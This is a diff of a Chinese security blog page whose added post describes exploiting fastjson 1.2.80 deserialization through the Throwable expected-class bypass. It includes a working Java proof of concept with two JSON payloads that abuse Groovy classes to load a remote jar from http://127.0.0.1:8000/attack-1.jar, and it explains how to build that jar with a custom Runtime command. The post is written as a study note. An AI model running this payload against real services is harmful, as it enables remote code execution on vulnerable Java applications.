@@ -6,7 +6,7 @@
   <meta charset="utf-8">
   <!-- SEO相关 -->
   
-  <link rel="canonical" href="http://example.com/about/"/>
+  <link rel="canonical" href="http://example.com/2025/08/10/fastjson-1-2-80利用/"/>
   <!-- 渲染优化 -->
     <meta http-equiv='x-dns-prefetch-control' content='on' />
       <link rel='dns-prefetch' href='https://unpkg.com'>
@@ -34,20 +34,22 @@
 
   <!-- feed -->
   <!-- 页面元数据 -->
-  <title>关于 - n1utra's blog</title>
-  <meta name="keywords" content="null">
+  <title>浅述Fastjson(3)：FastJson 1.2.80利用 - n1utra's blog</title>
+  <meta name="keywords" content="JAVA安全,FastJson反序列化,null">
   <meta desc name="description" content="网络安全 - n1utra - n1utra's blog">
   
-<meta property="og:type" content="website">
-<meta property="og:title" content="n1utra&#39;s blog">
-<meta property="og:url" content="http://example.com/about/index.html">
+<meta property="og:type" content="article">
+<meta property="og:title" content="浅述Fastjson(3)：FastJson 1.2.80利用">
+<meta property="og:url" content="http://example.com/2025/08/10/FastJson-1-2-80%E5%88%A9%E7%94%A8/index.html">
 <meta property="og:site_name" content="n1utra&#39;s blog">
-<meta property="og:description" content="一个用来记录自己学习过程的博客。">
+<meta property="og:description" content="1.2.80绕过1.2.80的绕过方式和1.2.68的绕过方式一样，同样是基于期望类进行绕过，但是期望类不同。1.2.80使用的是java.lang.Throwable这个类。 参考文章：fastjson 1.2.80 漏洞浅析及利用payload - PYkiller - 博客园 这里直接给出payload 可以看到这里执行了两个字符串，那么在实际应用过程中，需要将这两个分别执行。 123456">
 <meta property="og:locale">
 <meta property="og:image" content="https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png">
-<meta property="article:published_time" content="2025-07-06T15:25:15.315Z">
-<meta property="article:modified_time" content="2025-07-06T15:25:15.315Z">
+<meta property="article:published_time" content="2025-08-10T13:23:49.000Z">
+<meta property="article:modified_time" content="2025-08-10T13:52:08.211Z">
 <meta property="article:author" content="n1utra">
+<meta property="article:tag" content="JAVA安全">
+<meta property="article:tag" content="FastJson反序列化">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png">
   <style>
@@ -2105,7 +2107,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 
 <script>
   window.pdata={}
-  pdata.ispage=false;
+  pdata.ispage=true;
   pdata.commentPath="";
   pdata.commentPlaceholder="";
   pdata.commentConfig={};
@@ -2438,7 +2440,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
       <div id="l_cover">
   
     
-      <div class="cover-wrapper docs dock" id='half'>
+      <div class="cover-wrapper post dock" id='half'>
         
   <div class='cover-bg lazyload placeholder' data-bg="https://gcore.jsdelivr.net/gh/MHG-LAB/cron@gh-pages/bing/bing.jpg"></div>
 
@@ -2505,8 +2507,8 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
         <div class="body-wrapper">
           
 <div id="l_main" class=''>
-  <article itemscope itemtype="https://schema.org.cn/Article" class="article post white-box reveal md shadow floatable blur article-type-docs" id="docs" itemscope itemprop="blogPost">
-  <link itemprop="mainEntityOfPage" href="http://example.com/about/index.html">
+  <article itemscope itemtype="https://schema.org.cn/Article" class="article post white-box reveal md shadow floatable blur article-type-post" id="post" itemscope itemprop="blogPost">
+  <link itemprop="mainEntityOfPage" href="http://example.com/2025/08/10/FastJson-1-2-80利用/">
   <span hidden itemprop="publisher" itemscope itemtype="https://schema.org.cn/Organization">
     <meta itemprop="name" content="n1utra's blog">
   </span>
@@ -2526,16 +2528,59 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     
     
     
-      <span hidden itemprop="name headline">
+      <h1 class="title" itemprop="name headline">
+        浅述Fastjson(3)：FastJson 1.2.80利用
+      </h1>
+      <div class='new-meta-box'>
         
-      </span>
+          
+            
+<div class='new-meta-item author' itemprop="author" itemscope itemtype="https://schema.org.cn/Person">
+  <a itemprop="url" class='author' href="/" rel="nofollow">
+    <img itemprop="image" src="/static/pic/avatar.jpg" class="lazyload" data-srcset="/static/pic/avatar.jpg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==">
+    <p itemprop="name">n1utra</p>
+  </a>
+</div>
+
+          
+        
+          
+            
+
+
+          
+        
+          
+            <div class="new-meta-item date" itemprop="dateCreated datePublished" datetime="2025-08-10T21:23:49+08:00">
+  <a class='notlink'>
+    <i class="fa-solid fa-calendar-alt fa-fw" aria-hidden="true"></i>
+    <p>发布于：Aug 10, 2025</p>
+  </a>
+</div>
+
+          
+        
+        <!-- Custom Files topMeta begin-->
+        
+        <!-- Custom Files topMeta end-->
+      </div>
     
   </div>
 
 
   <div id="layoutHelper-page-plugins"></div>
   <div id="post-body" itemprop="articleBody">
-    <p>一个用来记录自己学习过程的博客。</p>
+    <h1 id="1-2-80绕过"><a href="#1-2-80绕过" class="headerlink" title="1.2.80绕过"></a>1.2.80绕过</h1><p>1.2.80的绕过方式和1.2.68的绕过方式一样，同样是基于期望类进行绕过，但是期望类不同。1.2.80使用的是<code>java.lang.Throwable</code>这个类。</p>
+<p><strong>参考文章</strong>：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/pykiller/p/fastjson-1_2_80.html#1groovy%E9%93%BE">fastjson 1.2.80 漏洞浅析及利用payload - PYkiller - 博客园</a></p>
+<p>这里直接给出<code>payload</code></p>
+<p>可以看到这里执行了两个字符串，那么在实际应用过程中，需要将这两个分别执行。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">public static void main(String[] args) &#123;</span><br><span class="line">    String json =&quot;&#123;n&quot; +</span><br><span class="line">            &quot;  &quot;@type&quot;:&quot;java.lang.Exception&quot;,n&quot; +</span><br><span class="line">            &quot;  &quot;@type&quot;:&quot;org.codehaus.groovy.control.CompilationFailedException&quot;,n&quot; +</span><br><span class="line">            &quot;  &quot;unit&quot;:&#123;n&quot; +</span><br><span class="line">            &quot;  &#125;n&quot; +</span><br><span class="line">            &quot;&#125;&quot;;</span><br><span class="line"></span><br><span class="line">    try &#123;</span><br><span class="line">        // 反序列化将org.codehaus.groovy.control.ProcessingUnit 加入白名单</span><br><span class="line">        JSON.parse(json);</span><br><span class="line">    &#125; catch (Exception e) &#123;</span><br><span class="line">        //e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    json =</span><br><span class="line">            &quot;&#123;n&quot; +</span><br><span class="line">                    &quot;  &quot;@type&quot;:&quot;org.codehaus.groovy.control.ProcessingUnit&quot;,n&quot; +</span><br><span class="line">                    &quot;  &quot;@type&quot;:&quot;org.codehaus.groovy.tools.javac.JavaStubCompilationUnit&quot;,n&quot; +</span><br><span class="line">                    &quot;  &quot;config&quot;:&#123;n&quot; +</span><br><span class="line">                    &quot;    &quot;@type&quot;: &quot;org.codehaus.groovy.control.CompilerConfiguration&quot;,n&quot; +</span><br><span class="line">                    &quot;    &quot;classpathList&quot;:[&quot;http://127.0.0.1:8000/attack-1.jar&quot;]n&quot; +</span><br><span class="line">                    &quot;  &#125;,n&quot; +</span><br><span class="line">                    &quot;  &quot;gcl&quot;:null,n&quot; +</span><br><span class="line">                    &quot;  &quot;destDir&quot;: &quot;/tmp&quot;n&quot; +</span><br><span class="line">                    &quot;&#125;&quot;;</span><br><span class="line">    // 反序列化将执行</span><br><span class="line">    JSONObject.parse(json);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>其中<code>attack-1.jar</code>来自<code>[Lonely-night/fastjsonVul: fastjson 80 远程代码执行漏洞复现](https://github.com/Lonely-night/fastjsonVul)</code></p>
+<p>将代码克隆到本地后，修改<code>attack\src\main\java\groovy\grape\GrabAnnotationTransformation2</code>中<code>Runtime</code>执行的命令，这里原始命令是<code>mac</code>的命令，根据系统进行修改，然后通过<code>maven</code>菜单打包为<code>jar</code>包即可</p>
+<p><img src="/static/pic/image-20250810213700183.png" class="lazyload" data-srcset="/static/pic/image-20250810213700183.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20250810213700183"></p>
+<p>打包后的<code>jar</code>包存在<code>target</code>目录中，将其部署到服务中，运行<code>payload</code>即可看到效果。</p>
+<p>这里有点厌倦了，不描述执行流程了。</p>
 
   </div>
   
@@ -2559,6 +2604,16 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
   <div class='article-meta' id="bottom">
     <div class='new-meta-box'>
       
+        
+          <div class="new-meta-item date" itemprop="dateModified" datetime="2025-08-10T21:52:08+08:00">
+  <a class='notlink'>
+    <i class="fa-solid fa-edit fa-fw" aria-hidden="true"></i>
+    <p>更新于：Aug 10, 2025</p>
+  </a>
+</div>
+
+        
+      
     </div>
     <!-- Custom Files bottomMeta begin -->
     
@@ -2569,6 +2624,21 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
   
   
 
+  
+    <div class="prev-next">
+      
+      
+        <a class='next' href='/2025/08/07/FastJson-1-2-68%E5%8F%8A%E4%B9%8B%E5%89%8D%E5%88%A9%E7%94%A8/'>
+          <p class='title'>浅述Fastjson(3)：FastJson 1.2.68及之前利用<i class="fa-solid fa-chevron-right" aria-hidden="true"></i></p>
+          <p class='content'>1.2.47修复在1.2.48中，针对1.2.47的缓存绕过，修复了两个地方：
+
+MiscCodec类
+TypeUtils类
+
+MiscCodec修复1.2.47及之前，在解析java.lang...</p>
+        </a>
+      
+    </div>
   
   <!-- 文章推荐 -->
   
@@ -2595,102 +2665,31 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     
     
       
-<section class="widget blogger desktop mobile ">
-  <div class='content'>
-    
-      
-        <a class='avatar flat-box rectangle' href='/'>
-          <img no-lazy src='/static/pic/avatar.jpg'/>
-        </a>
-      
-    
-    
-      <div class='text'>
-        
-          <h2>n1utra</h2>
-        
-        
-          <p>与其感慨路难行，不如马上出发</p>
-
-        
-        
-      </div>
-    
-    
-      <div class="social-wrapper">
-        
-          
-            <a href="https://github.com/n1utra/"
-              class="social fab fa-github flat-btn"
-              target="_blank"
-              rel="external nofollow noopener noreferrer">
-              
-            </a>
-          
-        
-      </div>
-    
-  </div>
-</section>
-
-    
-  
-
-  
-    
-    
-      
-  
-  <section class="widget category desktop">
-    
-  <header>
-    
-      <a href='/blog/categories/'><i class="fa-solid fa-folder-open fa-fw" aria-hidden="true"></i><span class='name'>文章分类</span></a>
-    
-  </header>
-
-
-    <div class='content'>
-      <ul class="entry navigation">
-        
-          <li><a class="flat-box"
-            title="/categories/JAVA%E5%AE%89%E5%85%A8/" href="/categories/JAVA%E5%AE%89%E5%85%A8/"
-            active-action="action-categoriesJAVAE5AE89E585A8"
-            ><div class='name'>JAVA安全</div><div class='badge'>(9)</div></a></li>
-        
-      </ul>
-    </div>
-  </section>
-
-
-    
-  
-
-  
-    
-    
-      
-  
-  <section class="widget tagcloud desktop mobile">
-    
-  <header>
-    
-      <a href='/blog/tags/'><i class="fa-solid fa-tags fa-fw" aria-hidden="true"></i><span class='name'>热门标签</span></a>
-    
-  </header>
-
-
-    <div class='content'>
-      <a href="/tags/CC%E9%93%BE/" style="font-size: 19px; color: #777">CC链</a> <a href="/tags/FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="font-size: 14px; color: #999">FastJson反序列化</a> <a href="/tags/JAVA%E5%AE%89%E5%85%A8/" style="font-size: 24px; color: #555">JAVA安全</a>
-    </div>
-  </section>
-
-
     
   
 
 
 <div class="widget-sticky">
+
+  
+  
+
+
+<section class="widget toc-wrapper desktop mobile" id="toc-div" >
+  
+  <header>
+    
+      <i class="fa-solid fa-list fa-fw" aria-hidden="true"></i><span class='name'>本文目录</span>
+    
+  </header>
+
+
+  <div class='content'>
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#1-2-80%E7%BB%95%E8%BF%87"><span class="toc-number">1.</span> <span class="toc-text">1.2.80绕过</span></a></li></ol>
+  </div>
+</section>
+
+  
 
 </div>
 
@@ -3093,7 +3092,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 </script>
 
 
-  <script type="application/ld+json">[{"@context":"https://schema.org.cn","@type":"Organization","name":"n1utra's blog","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},{"@context":"https://schema.org.cn","@type":"Person","name":"n1utra","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","sameAs":["https://github.com/volantis-x"],"description":"网络安全"},{"@context":"https://schema.org.cn","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"http://example.com/","name":"n1utra's blog"}}]},{"@context":"https://schema.org.cn","@type":"WebSite","name":"n1utra's blog","url":"http://example.com/","keywords":null,"description":"网络安全","author":{"@type":"Person","name":"n1utra","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","description":"网络安全"},"publisher":{"@type":"Organization","name":"n1utra's blog","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"potentialAction":{"@type":"SearchAction","name":"Site Search","target":{"@type":"EntryPoint","urlTemplate":"http://example.com?s={search_term_string}"},"query-input":"required name=search_term_string"}},{"@context":"https://schema.org.cn","@type":"BlogPosting","headline":"关于","description":"网络安全","inLanguage":"zh","mainEntityOfPage":{"@type":"WebPage","@id":"http://example.com/about/index.html"},"author":{"@type":"Person","name":"n1utra","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/"},"publisher":{"@type":"Organization","name":"n1utra's blog","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"url":"http://example.com/about/index.html","wordCount":0,"datePublished":"2025-07-06T15:25:15.315Z","dateModified":"2025-07-06T15:25:15.315Z","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}}]</script>
+  <script type="application/ld+json">[{"@context":"https://schema.org.cn","@type":"Organization","name":"n1utra's blog","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},{"@context":"https://schema.org.cn","@type":"Person","name":"n1utra","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","sameAs":["https://github.com/volantis-x"],"description":"网络安全"},{"@context":"https://schema.org.cn","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"http://example.com/","name":"n1utra's blog"}},{"@type":"ListItem","position":3,"item":{"@id":"http://example.com/2025/08/10/FastJson-1-2-80利用/","name":"浅述Fastjson(3)：FastJson 1.2.80利用"}}]},{"@context":"https://schema.org.cn","@type":"WebSite","name":"n1utra's blog","url":"http://example.com/","keywords":null,"description":"网络安全","author":{"@type":"Person","name":"n1utra","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","description":"网络安全"},"publisher":{"@type":"Organization","name":"n1utra's blog","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"potentialAction":{"@type":"SearchAction","name":"Site Search","target":{"@type":"EntryPoint","urlTemplate":"http://example.com?s={search_term_string}"},"query-input":"required name=search_term_string"}},{"@context":"https://schema.org.cn","@type":"BlogPosting","headline":"浅述Fastjson(3)：FastJson 1.2.80利用","description":"网络安全","inLanguage":"zh","mainEntityOfPage":{"@type":"WebPage","@id":"http://example.com/2025/08/10/FastJson-1-2-80%E5%88%A9%E7%94%A8/"},"author":{"@type":"Person","name":"n1utra","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/"},"publisher":{"@type":"Organization","name":"n1utra's blog","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"url":"http://example.com/2025/08/10/FastJson-1-2-80%E5%88%A9%E7%94%A8/","wordCount":0,"datePublished":"2025-08-10T13:23:49.000Z","dateModified":"2025-08-10T13:52:08.211Z","keywords":"JAVA安全,FastJson反序列化","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}}]</script>
 
 
 
